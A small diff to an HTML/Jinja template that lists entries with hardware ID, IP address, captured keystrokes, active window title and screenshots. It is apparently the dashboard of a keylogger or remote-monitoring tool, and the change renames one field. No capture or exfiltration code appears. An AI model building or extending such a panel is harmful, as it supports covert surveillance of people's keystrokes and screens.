@@ -81,7 +81,7 @@
                 <td>{{ entry.hwid or "N/A" }}</td>
                 <td>{{ entry.ip_address or "N/A" }}</td>
                 <td class="keys">{{ entry.keys or "N/A" }}</td>
-                <td>{{ entry.window or "N/A" }}</td>
+                <td>{{ entry.active_window or "N/A" }}</td>
                 <td>
                     {% if entry.screenshot %}
                         <img class="screenshot" src="data:image/png;base64,{{ entry.screenshot }}" alt="Screenshot" />
@@ -95,3 +95,4 @@
     </table>
 </body>
 </html>
+
